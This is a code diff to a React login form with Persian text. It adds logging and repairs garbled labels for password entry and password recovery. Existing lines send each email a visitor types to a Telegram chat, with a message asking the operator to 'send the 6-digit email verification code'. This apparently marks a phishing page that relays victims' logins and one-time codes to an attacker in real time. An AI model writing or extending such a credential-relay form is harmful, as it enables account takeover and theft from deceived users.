@@ -409,15 +409,20 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Sending email to Telegram:", email);
+      console.log("📧 Starting email submission:", email);
 
       // Send email to Telegram and store message ID
       const result = await sendCustomMessageToTelegram(
         `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
       );
 
+      console.log("📧 Email submission result:", result);
+
       if (result.success && result.messageId) {
         setEmailMessageId(result.messageId);
+        console.log("✅ Message ID stored:", result.messageId);
+      } else {
+        console.log("❌ No message ID received or submission failed");
       }
 
       setEmailStep("code");
@@ -2019,7 +2024,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز عبور حساب را وارد کنی��.
+                    رمز عبور حساب را وارد کنید.
                   </label>
                   <div
                     style={{
@@ -2370,7 +2375,7 @@ export const LoginForm = () => {
                       textDecoration: "none",
                     }}
                   >
-                    بازیا��ی رمز عبور
+                    بازیابی رمز عبور
                   </a>
                 </div>
 
